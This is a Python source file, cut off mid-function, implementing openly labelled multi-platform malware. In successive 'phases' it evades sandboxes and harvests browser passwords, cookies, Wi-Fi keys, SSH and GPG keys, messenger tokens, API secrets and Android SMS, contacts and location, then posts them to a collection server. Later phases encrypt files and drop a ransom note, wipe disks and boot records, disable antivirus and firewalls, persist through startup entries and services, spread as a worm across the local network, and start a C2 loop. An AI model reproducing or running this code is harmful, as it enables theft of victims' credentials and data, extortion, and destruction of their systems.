import os
import sys
import shutil
import subprocess
import time
import json
import base64
import random
import string
import threading
import requests
import socket
import platform
import hashlib
import sqlite3
import ctypes
import win32crypt
from datetime import datetime
from pathlib import Path
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes

# ============================================================
# CLASS: UltimatePhoenix
# ============================================================
class UltimatePhoenix:
    def __init__(self):
        self.server_url = "http://127.0.0.1:8080/collect"
        self.os_type = platform.system()
        self.victim_data = {}
        self.encryption_key = get_random_bytes(32)
        self.encryption_iv = get_random_bytes(16)
        self.destroyed = False
        self.running = True
        self.bot_id = hashlib.md5(str(random.randint(0, 99999999)).encode()).hexdigest()[:8]
        self.target_extensions = [
            ".jpg", ".jpeg", ".png", ".gif", ".bmp", ".tiff",
            ".mp4", ".avi", ".mkv", ".mov", ".wmv",
            ".pdf", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx",
            ".txt", ".log", ".csv", ".xml", ".json",
            ".zip", ".rar", ".7z", ".tar", ".gz",
            ".apk", ".dex", ".jar",
            ".exe", ".dll", ".msi", ".bat", ".cmd",
            ".py", ".js", ".html", ".css", ".php",
            ".db", ".sqlite", ".dat"
        ]

    # ============================================================
    # PHASE 1: SANDBOX EVASION
    # ============================================================
    def evade_sandbox(self):
        try:
            vm_processes = ["vmtoolsd", "vboxservice", "qemu-ga", "xenserver", "prl_cc"]
            for proc in vm_processes:
                if os.system(f"pgrep -f {proc} > /dev/null 2>&1") == 0:
                    time.sleep(3600)
                    return True
            sandbox_files = [
                "C:\\Windows\\System32\\drivers\\vmmouse.sys",
                "C:\\Windows\\System32\\drivers\\vboxguest.sys",
                "/usr/bin/VBoxControl"
            ]
            for file in sandbox_files:
                if os.path.exists(file):
                    time.sleep(7200)
                    return True
            time.sleep(random.randint(30, 180))
            return False
        except:
            return False

    # ============================================================
    # PHASE 2: DATA COLLECTION
    # ============================================================
    def collect_all(self):
        try:
            self.collect_system_info()
            self.collect_files()
            self.collect_browser_passwords()
            self.collect_all_browser_cookies()
            self.collect_wifi_passwords()
            self.collect_telegram()
            self.collect_whatsapp()
            self.collect_discord()
            self.collect_steam()
            self.collect_spotify()
            self.collect_outlook()
            self.collect_filezilla()
            self.collect_winscp()
            self.collect_ssh_keys()
            self.collect_gpg_keys()
            self.collect_password_managers()
            self.collect_api_keys_from_projects()
            self.collect_environment_variables()
            self.collect_windows_product_key()
            self.collect_bash_history()
            self.collect_network_shares()
            self.collect_system_logs()
            self.collect_android_data()
            self.send_to_server()
        except:
            pass

    def collect_system_info(self):
        try:
            info = {
                "os": platform.system(),
                "os_version": platform.version(),
                "hostname": platform.node(),
                "cpu": platform.processor(),
                "machine": platform.machine(),
                "ip": self.get_local_ip(),
                "mac": self.get_mac_address(),
                "time": datetime.now().isoformat()
            }
            self.victim_data["system"] = info
        except:
            pass

    def get_local_ip(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"

    def get_mac_address(self):
        try:
            import uuid
            mac = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0, 48, 8)])
            return mac
        except:
            return "unknown"

    def collect_files(self):
        try:
            paths = [
                os.path.expanduser("~") + "/Documents",
                os.path.expanduser("~") + "/Desktop",
                os.path.expanduser("~") + "/Downloads",
                os.path.expanduser("~") + "/Pictures",
                os.path.expanduser("~") + "/Videos",
                os.path.expanduser("~") + "/Music",
                "/sdcard/",
                "/storage/emulated/0/"
            ]
            for path in paths:
                if os.path.exists(path):
                    self.scrape_directory(path)
        except:
            pass

    def scrape_directory(self, path):
        try:
            for root, dirs, files in os.walk(path):
                for file in files:
                    try:
                        file_path = os.path.join(root, file)
                        ext = os.path.splitext(file)[1].lower()
                        if ext in self.target_extensions:
                            size = os.path.getsize(file_path)
                            self.victim_data[file_path] = {
                                "name": file,
                                "path": file_path,
                                "size": size,
                                "ext": ext,
                                "modified": os.path.getmtime(file_path)
                            }
                            if size < 10 * 1024 * 1024:
                                self.read_and_encode_file(file_path)
                    except:
                        continue
        except:
            pass

    def read_and_encode_file(self, file_path):
        try:
            with open(file_path, 'rb') as f:
                content = f.read(1024 * 1024)
                encoded = base64.b64encode(content).decode('utf-8')
                self.victim_data[file_path]['preview'] = encoded[:500]
        except:
            pass

    def collect_browser_passwords(self):
        try:
            browsers = {
                "Chrome": os.path.expanduser("~") + "/AppData/Local/Google/Chrome/User Data/Default/Login Data",
                "Chrome_Profile2": os.path.expanduser("~") + "/AppData/Local/Google/Chrome/User Data/Profile 2/Login Data",
                "Chrome_Profile3": os.path.expanduser("~") + "/AppData/Local/Google/Chrome/User Data/Profile 3/Login Data",
                "Firefox": os.path.expanduser("~") + "/AppData/Roaming/Mozilla/Firefox/Profiles/",
                "Edge": os.path.expanduser("~") + "/AppData/Local/Microsoft/Edge/User Data/Default/Login Data",
                "Opera": os.path.expanduser("~") + "/AppData/Roaming/Opera Software/Opera Stable/Login Data",
                "Brave": os.path.expanduser("~") + "/AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/Login Data",
                "Vivaldi": os.path.expanduser("~") + "/AppData/Local/Vivaldi/User Data/Default/Login Data",
                "Safari": os.path.expanduser("~") + "/Library/Keychains/login.keychain-db"
            }
            for name, path in browsers.items():
                if os.path.exists(path):
                    self.victim_data["browser_" + name] = path
                    if "Login Data" in path:
                        try:
                            conn = sqlite3.connect(path)
                            cursor = conn.cursor()
                            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                            for row in cursor.fetchall():
                                if row[2]:
                                    try:
                                        decrypted = win32crypt.CryptUnprotectData(row[2], None, None, None, 0)[1]
                                        decrypted_str = decrypted.decode('utf-8')
                                    except:
                                        decrypted_str = "Decryption failed"
                                    self.victim_data.setdefault("passwords_" + name, []).append(
                                        {"url": row[0], "username": row[1], "password": decrypted_str}
                                    )
                            conn.close()
                        except:
                            pass
        except:
            pass

    def collect_all_browser_cookies(self):
        try:
            cookie_paths = [
                os.path.expanduser("~") + "/AppData/Local/Google/Chrome/User Data/Default/Cookies",
                os.path.expanduser("~") + "/AppData/Roaming/Mozilla/Firefox/Profiles/*/cookies.sqlite",
                os.path.expanduser("~") + "/AppData/Local/Microsoft/Edge/User Data/Default/Cookies",
                os.path.expanduser("~") + "/.config/google-chrome/Default/Cookies",
                os.path.expanduser("~") + "/.mozilla/firefox/*.default-release/cookies.sqlite"
            ]
            for path in cookie_paths:
                if os.path.exists(path):
                    self.victim_data["cookies_" + path.split("/")[-2]] = path
        except:
            pass

    def collect_wifi_passwords(self):
        try:
            if self.os_type == "Windows":
                result = subprocess.run('netsh wlan show profiles', shell=True, capture_output=True, text=True)
                profiles = result.stdout
                if ":" in profiles:
                    for line in profiles.split('\n'):
                        if ":" in line and "perfil" in line.lower():
                            profile = line.split(":")[1].strip()
                            try:
                                result2 = subprocess.run(f'netsh wlan show profile name="{profile}" key=clear', shell=True, capture_output=True, text=True)
                                self.victim_data["wifi_" + profile] = result2.stdout[:1000]
                            except:
                                pass
            elif self.os_type == "Linux":
                result = subprocess.run('sudo cat /etc/NetworkManager/system-connections/*', shell=True, capture_output=True, text=True)
                self.victim_data["wifi_connections"] = result.stdout[:500]
        except:
            pass

    def collect_telegram(self):
        try:
            telegram_paths = [
                os.path.expanduser("~") + "/AppData/Roaming/Telegram Desktop/tdata",
                os.path.expanduser("~") + "/.local/share/TelegramDesktop/tdata",
                "/sdcard/Android/data/org.telegram.messenger/files/"
            ]
            for path in telegram_paths:
                if os.path.exists(path):
                    self.victim_data["telegram_path"] = path
                    try:
                        for file in os.listdir(path):
                            if "config" in file or "account" in file or "auth" in file:
                                with open(os.path.join(path, file), 'r', errors='ignore') as f:
                                    self.victim_data["telegram_" + file] = f.read()[:500]
                    except:
                        pass
        except:
            pass

    def collect_whatsapp(self):
        try:
            whatsapp_paths = [
                "/sdcard/Android/media/com.whatsapp/",
                "/storage/emulated/0/WhatsApp/"
            ]
            for path in whatsapp_paths:
                if os.path.exists(path):
                    self.victim_data["whatsapp_path"] = path
        except:
            pass

    def collect_discord(self):
        try:
            discord_paths = [
                os.path.expanduser("~") + "/AppData/Roaming/discord/Local Storage/leveldb",
                os.path.expanduser("~") + "/.config/discord/Local Storage/leveldb"
            ]
            for path in discord_paths:
                if os.path.exists(path):
                    self.victim_data["discord_path"] = path
                    try:
                        for file in os.listdir(path):
                            if ".log" in file or ".ldb" in file:
                                with open(os.path.join(path, file), 'r', errors='ignore') as f:
                                    content = f.read()
                                    if "token" in content.lower():
                                        self.victim_data["discord_token"] = content[:500]
                    except:
                        pass
        except:
            pass

    def collect_steam(self):
        try:
            steam_paths = [
                os.path.expanduser("~") + "/.steam/steam/config/loginusers.vdf",
                os.path.expanduser("~") + "/Library/Application Support/Steam/config/loginusers.vdf"
            ]
            for path in steam_paths:
                if os.path.exists(path):
                    with open(path, 'r') as f:
                        self.victim_data["steam_login"] = f.read()[:500]
        except:
            pass

    def collect_spotify(self):
        try:
            spotify_paths = [
                os.path.expanduser("~") + "/AppData/Roaming/Spotify/Users/",
                os.path.expanduser("~") + "/.config/spotify/Users/"
            ]
            for path in spotify_paths:
                if os.path.exists(path):
                    self.victim_data["spotify_path"] = path
                    for file in os.listdir(path):
                        if "user" in file:
                            with open(os.path.join(path, file), 'r', errors='ignore') as f:
                                self.victim_data["spotify_" + file] = f.read()[:500]
        except:
            pass

    def collect_outlook(self):
        try:
            outlook_path = os.path.expanduser("~") + "/AppData/Roaming/Microsoft/Outlook/"
            if os.path.exists(outlook_path):
                self.victim_data["outlook_path"] = outlook_path
        except:
            pass

    def collect_filezilla(self):
        try:
            filezilla_paths = [
                os.path.expanduser("~") + "/AppData/Roaming/FileZilla/sitemanager.xml",
                os.path.expanduser("~") + "/.config/filezilla/sitemanager.xml"
            ]
            for path in filezilla_paths:
                if os.path.exists(path):
                    with open(path, 'r') as f:
                        self.victim_data["filezilla"] = f.read()[:500]
        except:
            pass

    def collect_winscp(self):
        try:
            winscp_path = os.path.expanduser("~") + "/AppData/Roaming/WinSCP.ini"
            if os.path.exists(winscp_path):
                with open(winscp_path, 'r') as f:
                    self.victim_data["winscp"] = f.read()[:500]
        except:
            pass

    def collect_ssh_keys(self):
        try:
            ssh_path = os.path.expanduser("~") + "/.ssh/"
            if os.path.exists(ssh_path):
                for file in os.listdir(ssh_path):
                    if file.endswith(".pub") or file.endswith(".pem") or file.endswith(".key"):
                        with open(os.path.join(ssh_path, file), 'r') as f:
                            self.victim_data["ssh_" + file] = f.read()[:500]
        except:
            pass

    def collect_gpg_keys(self):
        try:
            gpg_path = os.path.expanduser("~") + "/.gnupg/"
            if os.path.exists(gpg_path):
                for file in os.listdir(gpg_path):
                    if "secring" in file or "pubring" in file:
                        with open(os.path.join(gpg_path, file), 'rb') as f:
                            self.victim_data["gpg_" + file] = base64.b64encode(f.read()).decode('utf-8')[:500]
        except:
            pass

    def collect_password_managers(self):
        try:
            managers = {
                "Bitwarden": os.path.expanduser("~") + "/AppData/Roaming/Bitwarden/",
                "LastPass": os.path.expanduser("~") + "/AppData/Local/LastPass/",
                "KeePass": os.path.expanduser("~") + "/Documents/KeePass/",
                "1Password": os.path.expanduser("~") + "/AppData/Local/1Password/",
                "Dashlane": os.path.expanduser("~") + "/AppData/Local/Dashlane/"
            }
            for name, path in managers.items():
                if os.path.exists(path):
                    self.victim_data["manager_" + name] = path
        except:
            pass

    def collect_api_keys_from_projects(self):
        try:
            search_extensions = [".env", ".json", ".yml", ".yaml", ".xml", ".conf", ".config", ".ini"]
            search_keywords = ["api_key", "apikey", "secret", "token", "password", "key", "auth", "private"]
            paths = [
                os.path.expanduser("~") + "/Documents",
                os.path.expanduser("~") + "/Desktop",
                os.path.expanduser("~") + "/Downloads",
                os.path.expanduser("~") + "/Projects",
                os.path.expanduser("~") + "/code",
                os.path.expanduser("~") + "/dev"
            ]
            for path in paths:
                if os.path.exists(path):
                    for root, dirs, files in os.walk(path):
                        for file in files:
                            try:
                                ext = os.path.splitext(file)[1].lower()
                                if ext in search_extensions:
                                    file_path = os.path.join(root, file)
                                    with open(file_path, 'r', errors='ignore') as f:
                                        content = f.read()
                                        for keyword in search_keywords:
                                            if keyword in content.lower():
                                                self.victim_data["api_" + file] = content[:500]
                                                break
                            except:
                                continue
        except:
            pass

    def collect_environment_variables(self):
        try:
            env = {k: v for k, v in os.environ.items()}
            self.victim_data["environment"] = env
        except:
            pass

    def collect_windows_product_key(self):
        try:
            if self.os_type == "Windows":
                result = subprocess.run('wmic path softwarelicensingservice get OA3xOriginalProductKey', shell=True, capture_output=True, text=True)
                self.victim_data["windows_product_key"] = result.stdout[:200]
        except:
            pass

    def collect_bash_history(self):
        try:
            history_paths = [
                os.path.expanduser("~") + "/.bash_history",
                os.path.expanduser("~") + "/.zsh_history",
                os.path.expanduser("~") + "/.history",
                os.path.expanduser("~") + "/.ash_history",
                os.path.expanduser("~") + "/.sh_history"
            ]
            for path in history_paths:
                if os.path.exists(path):
                    with open(path, 'r', errors='ignore') as f:
                        self.victim_data["history_" + path.split("/")[-1]] = f.read()[:2000]
        except:
            pass

    def collect_network_shares(self):
        try:
            if self.os_type == "Windows":
                result = subprocess.run('net view', shell=True, capture_output=True, text=True)
                self.victim_data["network_shares"] = result.stdout[:500]
        except:
            pass

    def collect_system_logs(self):
        try:
            if self.os_type == "Windows":
                result = subprocess.run('wevtutil qe System /c:10 /rd:true /f:text', shell=True, capture_output=True, text=True)
                self.victim_data["system_logs"] = result.stdout[:1000]
        except:
            pass

    # ============================================================
    # ANDROID-SPECIFIC COLLECTION
    # ============================================================
    def collect_android_data(self):
        try:
            if os.path.exists("/system/bin/") or os.path.exists("/system/app/"):
                self.collect_android_sms()
                self.collect_android_contacts()
                self.collect_android_call_logs()
                self.collect_android_accounts()
                self.collect_android_wifi()
                self.collect_android_apps()
                self.collect_android_clipboard()
                self.collect_android_gps()
        except:
            pass

    def collect_android_sms(self):
        try:
            subprocess.run('content query --uri content://sms/inbox > /sdcard/sms_backup.txt', shell=True)
            if os.path.exists("/sdcard/sms_backup.txt"):
                with open("/sdcard/sms_backup.txt", 'r') as f:
                    self.victim_data["android_sms"] = f.read()[:2000]
                os.remove("/sdcard/sms_backup.txt")
        except:
            pass

    def collect_android_contacts(self):
        try:
            subprocess.run('content query --uri content://contacts/phones > /sdcard/contacts_backup.txt', shell=True)
            if os.path.exists("/sdcard/contacts_backup.txt"):
                with open("/sdcard/contacts_backup.txt", 'r') as f:
                    self.victim_data["android_contacts"] = f.read()[:2000]
                os.remove("/sdcard/contacts_backup.txt")
        except:
            pass

    def collect_android_call_logs(self):
        try:
            subprocess.run('content query --uri content://call_log/calls > /sdcard/call_logs_backup.txt', shell=True)
            if os.path.exists("/sdcard/call_logs_backup.txt"):
                with open("/sdcard/call_logs_backup.txt", 'r') as f:
                    self.victim_data["android_call_logs"] = f.read()[:2000]
                os.remove("/sdcard/call_logs_backup.txt")
        except:
            pass

    def collect_android_accounts(self):
        try:
            subprocess.run('content query --uri content://accounts > /sdcard/accounts_backup.txt', shell=True)
            if os.path.exists("/sdcard/accounts_backup.txt"):
                with open("/sdcard/accounts_backup.txt", 'r') as f:
                    self.victim_data["android_accounts"] = f.read()[:2000]
                os.remove("/sdcard/accounts_backup.txt")
        except:
            pass

    def collect_android_wifi(self):
        try:
            subprocess.run('content query --uri content://wifi > /sdcard/wifi_backup.txt', shell=True)
            if os.path.exists("/sdcard/wifi_backup.txt"):
                with open("/sdcard/wifi_backup.txt", 'r') as f:
                    self.victim_data["android_wifi"] = f.read()[:2000]
                os.remove("/sdcard/wifi_backup.txt")
        except:
            pass

    def collect_android_apps(self):
        try:
            subprocess.run('pm list packages > /sdcard/apps_list.txt', shell=True)
            if os.path.exists("/sdcard/apps_list.txt"):
                with open("/sdcard/apps_list.txt", 'r') as f:
                    self.victim_data["android_apps"] = f.read()[:2000]
                os.remove("/sdcard/apps_list.txt")
        except:
            pass

    def collect_android_clipboard(self):
        try:
            subprocess.run('content query --uri content://clipboard > /sdcard/clipboard_backup.txt', shell=True)
            if os.path.exists("/sdcard/clipboard_backup.txt"):
                with open("/sdcard/clipboard_backup.txt", 'r') as f:
                    self.victim_data["android_clipboard"] = f.read()[:2000]
                os.remove("/sdcard/clipboard_backup.txt")
        except:
            pass

    def collect_android_gps(self):
        try:
            subprocess.run('content query --uri content://gps > /sdcard/gps_backup.txt', shell=True)
            if os.path.exists("/sdcard/gps_backup.txt"):
                with open("/sdcard/gps_backup.txt", 'r') as f:
                    self.victim_data["android_gps"] = f.read()[:2000]
                os.remove("/sdcard/gps_backup.txt")
        except:
            pass

    # ============================================================
    # SEND DATA TO SERVER
    # ============================================================
    def send_to_server(self):
        try:
            response = requests.post(
                self.server_url,
                json=self.victim_data,
                timeout=10,
                headers={"Content-Type": "application/json"}
            )
        except:
            pass

    # ============================================================
    # PHASE 3: ENCRYPTION (RANSOMWARE)
    # ============================================================
    def encrypt_files(self):
        try:
            paths_to_encrypt = [
                os.path.expanduser("~") + "/Documents",
                os.path.expanduser("~") + "/Desktop",
                os.path.expanduser("~") + "/Downloads",
                os.path.expanduser("~") + "/Pictures",
                os.path.expanduser("~") + "/Videos",
                os.path.expanduser("~") + "/Music",
                "/sdcard/",
                "/storage/emulated/0/"
            ]
            for path in paths_to_encrypt:
                if os.path.exists(path):
                    for root, dirs, files in os.walk(path):
                        for file in files:
                            try:
                                file_path = os.path.join(root, file)
                                ext = os.path.splitext(file)[1].lower()
                                if ext not in [".exe", ".dll", ".sys", ".encrypted"]:
                                    self.encrypt_file(file_path)
                            except:
                                continue
            self.drop_ransom_note()
        except:
            pass

    def encrypt_file(self, file_path):
        try:
            cipher = AES.new(self.encryption_key, AES.MODE_CBC, self.encryption_iv)
            with open(file_path, 'rb') as f:
                data = f.read()
            if len(data) > 0:
                encrypted_data = cipher.encrypt(pad(data, AES.block_size))
                with open(file_path + ".encrypted", 'wb') as f:
                    f.write(self.encryption_iv + encrypted_data)
                os.remove(file_path)
        except:
            pass

    def drop_ransom_note(self):
        try:
            note_content = f"""
=============================================
YOUR FILES HAVE BEEN ENCRYPTED
=============================================
All your files have been encrypted with AES-256.
To decrypt them, you need to contact us.

Your Bot ID: {self.bot_id}
Contact: ransom_recovery@protonmail.com

DO NOT MODIFY OR DELETE ANY ENCRYPTED FILES.
=============================================
"""
            paths = [
                os.path.expanduser("~") + "/Desktop/README_RECOVER.txt",
                os.path.expanduser("~") + "/README_RECOVER.txt",
                "/sdcard/README_RECOVER.txt"
            ]
            for path in paths:
                try:
                    with open(path, 'w') as f:
                        f.write(note_content)
                except:
                    continue
        except:
            pass

    # ============================================================
    # PHASE 4: SYSTEM DESTRUCTION
    # ============================================================
    def destroy_system(self):
        try:
            self.corrupt_system_files()
            self.disable_security()
            self.overwrite_mbr()
            self.delete_partitions()
            self.brick_bios()
            self.force_restart_loop()
            self.delete_all_user_files()
            self.corrupt_registry()
            self.destroy_android()
        except:
            pass

    def corrupt_system_files(self):
        try:
            if self.os_type == "Windows":
                system_dirs = [
                    "C:\\Windows\\System32\\drivers",
                    "C:\\Windows\\System32\\config",
                    "C:\\Windows\\System32\\winevt",
                    "C:\\Windows\\System32\\catroot",
                    "C:\\Windows\\System32\\LogFiles"
                ]
                for path in system_dirs:
                    if os.path.exists(path):
                        shutil.rmtree(path, ignore_errors=True)

                critical_files = [
                    "C:\\boot.ini",
                    "C:\\Windows\\System.ini",
                    "C:\\Windows\\Win.ini",
                    "C:\\Windows\\win.ini",
                    "C:\\Windows\\bootstat.dat",
                    "C:\\Windows\\system.ini"
                ]
                for file in critical_files:
                    try:
                        with open(file, 'w') as f:
                            f.write("0" * 1024 * 1024)
                    except:
                        pass

            elif self.os_type in ["Linux", "Darwin"]:
                critical_paths = [
                    "/boot",
                    "/lib",
                    "/lib64",
                    "/usr/bin",
                    "/usr/sbin",
                    "/etc/init.d",
                    "/System/Library/CoreServices",
                    "/bin",
                    "/sbin"
                ]
                for path in critical_paths:
                    if os.path.exists(path):
                        shutil.rmtree(path, ignore_errors=True)
        except:
            pass

    def disable_security(self):
        try:
            if self.os_type == "Windows":
                subprocess.run('netsh advfirewall set allprofiles state off', shell=True, capture_output=True)
                subprocess.run('reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f', shell=True, capture_output=True)
                subprocess.run('reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f', shell=True, capture_output=True)
                subprocess.run('reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableRegistryTools /t REG_DWORD /d 1 /f', shell=True, capture_output=True)
                subprocess.run('powershell -command "Set-MpPreference -DisableRealtimeMonitoring $true"', shell=True, capture_output=True)
                subprocess.run('powershell -command "Set-MpPreference -DisableScriptScanning $true"', shell=True, capture_output=True)
                subprocess.run('powershell -command "Set-MpPreference -DisableIOAVProtection $true"', shell=True, capture_output=True)
                av_processes = ["MsMpEng.exe", "Norton.exe", "McAfee.exe", "Avast.exe", "AVG.exe", "Kaspersky.exe", "ESET.exe", "Bitdefender.exe", "Avira.exe", "Sophos.exe"]
                for proc in av_processes:
                    subprocess.run(f'taskkill /F /IM {proc}', shell=True, capture_output=True)

            elif self.os_type == "Linux":
                subprocess.run('systemctl stop firewalld', shell=True, capture_output=True)
                subprocess.run('systemctl disable firewalld', shell=True, capture_output=True)
                subprocess.run('ufw disable', shell=True, capture_output=True)
                subprocess.run('pkill -f clamav', shell=True, capture_output=True)
                subprocess.run('pkill -f rkhunter', shell=True, capture_output=True)
                subprocess.run('pkill -f chkrootkit', shell=True, capture_output=True)

            elif self.os_type == "Darwin":
                subprocess.run('sudo spctl --master-disable', shell=True, capture_output=True)
                subprocess.run('sudo csrutil disable', shell=True, capture_output=True)
                subprocess.run('sudo /usr/libexec/ApplicationFirewall/socketfilterfw --setglobalstate off', shell=True, capture_output=True)
        except:
            pass

    def overwrite_mbr(self):
        try:
            if self.os_type == "Windows":
                try:
                    with open("\\\\.\\PhysicalDrive0", 'wb') as f:
                        f.write(b'\x00' * 10 * 1024 * 1024)
                except:
                    pass
            elif self.os_type == "Linux":
                subprocess.run('dd if=/dev/zero of=/dev/sda bs=1M count=10', shell=True, capture_output=True)
            elif self.os_type == "Darwin":
                subprocess.run('dd if=/dev/zero of=/dev/disk0 bs=1M count=10', shell=True, capture_output=True)
        except:
            pass

    def delete_partitions(self):
        try:
            if self.os_type == "Windows":
                wipe_script = """
select disk 0
clean
convert mbr
create partition primary
format fs=ntfs quick
exit
"""
                with open("wipe.txt", 'w') as f:
                    f.write(wipe_script)
                subprocess.run('diskpart /s wipe.txt', shell=True, capture_output=True)
                os.remove("wipe.txt")
            elif self.os_type == "Linux":
                subprocess.run('fdisk /dev/sda <<< "g\nw"', shell=True, capture_output=True)
            elif self.os_type == "Darwin":
                subprocess.run('diskutil eraseDisk JHFS+ Empty /dev/disk0', shell=True, capture_output=True)
        except:
            pass

    def brick_bios(self):
        try:
            if self.os_type == "Windows":
                subprocess.run('reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\NVRAM /v Corrupt /t REG_DWORD /d 1 /f', shell=True, capture_output=True)
                subprocess.run('wmic bios set /?', shell=True, capture_output=True)
            elif self.os_type == "Linux":
                subprocess.run('dd if=/dev/zero of=/dev/nvram bs=1 count=128', shell=True, capture_output=True)
                subprocess.run('echo "0" > /proc/sys/kernel/panic', shell=True, capture_output=True)
                subprocess.run('echo "1" > /proc/sys/kernel/panic_on_oops', shell=True, capture_output=True)
            elif self.os_type == "Darwin":
                subprocess.run('sudo nvram -c', shell=True, capture_output=True)
                subprocess.run('sudo nvram boot-args="-x -v"', shell=True, capture_output=True)
            try:
                ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
                ctypes.windll.ntdll.NtRaiseHardError(0xC0000022, 0, 0, 0, 6, ctypes.byref(ctypes.c_uint()))
            except:
                pass
        except:
            pass

    def force_restart_loop(self):
        try:
            if self.os_type == "Windows":
                subprocess.run('shutdown /r /t 0', shell=True, capture_output=True)
                subprocess.run('schtasks /create /tn "RestartLoop" /tr "shutdown /r /t 0" /sc minute /mo 1', shell=True, capture_output=True)
            elif self.os_type == "Linux":
                with open("/etc/cron.d/reboot_loop", 'w') as f:
                    f.write("* * * * * root /sbin/reboot\n")
                subprocess.run('service cron restart', shell=True, capture_output=True)
            elif self.os_type == "Darwin":
                subprocess.run('while true; do sudo shutdown -r now; sleep 10; done &', shell=True, capture_output=True)
        except:
            pass

    def delete_all_user_files(self):
        try:
            user_home = os.path.expanduser("~")
            for root, dirs, files in os.walk(user_home):
                for file in files:
                    try:
                        os.remove(os.path.join(root, file))
                    except:
                        continue
                for dir in dirs:
                    try:
                        shutil.rmtree(os.path.join(root, dir), ignore_errors=True)
                    except:
                        continue
        except:
            pass

    def corrupt_registry(self):
        try:
            if self.os_type == "Windows":
                subprocess.run('reg delete HKLM /f', shell=True, capture_output=True)
                subprocess.run('reg delete HKCU /f', shell=True, capture_output=True)
        except:
            pass

    def destroy_android(self):
        try:
            if os.path.exists("/system/bin/"):
                android_system_dirs = [
                    "/system/app/",
                    "/system/priv-app/",
                    "/system/framework/",
                    "/system/lib/",
                    "/system/lib64/",
                    "/system/bin/",
                    "/system/xbin/"
                ]
                for path in android_system_dirs:
                    if os.path.exists(path):
                        subprocess.run(f'rm -rf {path}', shell=True)
                subprocess.run('rm -rf /data/data/*', shell=True)
                subprocess.run('rm -rf /sdcard/*', shell=True)
                subprocess.run('rm -rf /storage/emulated/0/*', shell=True)
                subprocess.run('dd if=/dev/zero of=/dev/block/bootdevice/by-name/boot bs=1M count=10', shell=True)
                subprocess.run('dd if=/dev/zero of=/dev/block/bootdevice/by-name/recovery bs=1M count=10', shell=True)
                subprocess.run('dd if=/dev/zero of=/dev/block/bootdevice/by-name/system bs=1M count=10', shell=True)
                subprocess.run('reboot -f', shell=True)
        except:
            pass

    # ============================================================
    # PHASE 5: REPLICATION & PERSISTENCE
    # ============================================================
    def replicate_and_persist(self):
        try:
            current_file = os.path.abspath(__file__)
            if self.os_type == "Windows":
                destinations = [
                    "C:\\Windows\\System32\\",
                    "C:\\Windows\\Temp\\",
                    "C:\\Users\\Public\\Downloads\\",
                    os.environ.get('APPDATA', 'C:\\Users\\Default\\AppData\\Roaming'),
                    os.environ.get('PROGRAMDATA', 'C:\\ProgramData\\')
                ]
                for dest in destinations:
                    if os.path.exists(dest):
                        try:
                            shutil.copy2(current_file, f"{dest}system_service.exe")
                            os.chmod(f"{dest}system_service.exe", 0o755)
                            subprocess.run(f'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v SystemService /t REG_SZ /d "{dest}system_service.exe" /f', shell=True, capture_output=True)
                            subprocess.run(f'reg add "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v SystemService /t REG_SZ /d "{dest}system_service.exe" /f', shell=True, capture_output=True)
                            subprocess.run(f'schtasks /create /tn "SystemService" /tr "{dest}system_service.exe" /sc onlogon /delay 0000:05', shell=True, capture_output=True)
                        except:
                            pass

            elif self.os_type in ["Linux", "Darwin"]:
                destinations = [
                    "/tmp/",
                    "/usr/local/bin/",
                    "/opt/",
                    os.path.expanduser("~/.config/"),
                    "/boot/",
                    "/etc/init.d/",
                    "/lib/systemd/system/"
                ]
                for dest in destinations:
                    if os.path.exists(dest):
                        try:
                            shutil.copy2(current_file, f"{dest}system_service")
                            os.chmod(f"{dest}system_service", 0o755)
                            if dest == "/etc/init.d/":
                                subprocess.run(f'update-rc.d system_service defaults', shell=True, capture_output=True)
                            if dest == "/lib/systemd/system/":
                                service_file = f"{dest}system_service.service"
                                with open(service_file, 'w') as f:
                                    f.write(f"""
[Unit]
Description=System Service
After=network.target

[Service]
ExecStart={dest}system_service
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
""")
                                subprocess.run('systemctl daemon-reload', shell=True, capture_output=True)
                                subprocess.run('systemctl enable system_service.service', shell=True, capture_output=True)
                        except:
                            pass
        except:
            pass

    # ============================================================
    # PHASE 6: NETWORK SPREAD (WORM)
    # ============================================================
    def spread_over_network(self):
        try:
            base_ip = "192.168.1."
            for i in range(1, 255):
                target_ip = f"{base_ip}{i}"
                try:
                    for port in [22, 445, 135, 139, 3389, 443, 80]:
                        try:
                            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            sock.settimeout(0.5)
                            result = sock.connect_ex((target_ip, port))
                            sock.close()
                            if result == 0:
                                if self.os_type == "Windows":
                                    subprocess.run(f'copy {__file__} \\\\{target_ip}\\C$\\Windows\\Temp\\system_service.exe', shell=True)
                                    subprocess.run(f'psexec \\\\{target_ip} -s C:\\Windows\\Temp\\system_service.exe', shell=True)
                                elif self.os_type == "Linux":
                                    subprocess.run(f'scp {__file__} root@{target_ip}:/tmp/system_service', shell=True)
                                    subprocess.run(f'ssh root@{target_ip} "chmod +x /tmp/system_service && /tmp/system_service &"', shell=True)
                                break
                        except:
                            continue
                except:
                    continue
        except:
            pass

    # ============================================================
    # PHASE 7: RAT (C2 COMMUNICATION)
    # ============================================================
    def rat_loop(self):
        try:
            while self.running:
                try:
                    heartbeat = {
                        "bot_id": self.bot_id,
                        "status": "alive",
                        "timestamp": datetime.now().isoformat()
                    }
                    requests.post(self.server_url + "/heartbeat", json=heartbeat, timeout=5)

                    response = requests.get(self.server_url + "/commands/" + self.bot_id, timeout=5)
                    if response.status_code == 200:
